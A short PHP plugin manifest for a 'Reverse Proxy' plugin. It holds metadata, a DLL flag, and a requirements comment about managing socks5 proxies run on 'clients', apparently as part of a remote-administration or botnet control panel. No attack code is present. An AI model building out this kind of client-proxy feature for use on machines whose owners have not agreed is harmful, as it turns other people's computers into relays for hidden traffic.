<?php
if(!isset($initialized))
{
	include('../../pages/404.php');
}
/*
Requirements:
1. Can host multiple proxies
2. Can apply filters when creating proxy
3. Can view proxy status
4. Can suspende, delete resume proxy for each client or whole set.



*/
$plugin_name = "Reverse Proxy";
$plugin_guid = "44786606-0ad6-4b84-8884-6fa8856368d9"; // GUID should be different for diferent versions
$plugin_desc = "Turn your clients into reverse socks5 proxies!";
$plugin_author = "RonnyRoy";
$plugin_icon = "<i class='fa fa-desktop'></i>"; // Font awesome icons
$plugin_version_str = "1.0.0.0";
$plugin_version_int = 1000;
$plugin_has_dll = true;
?>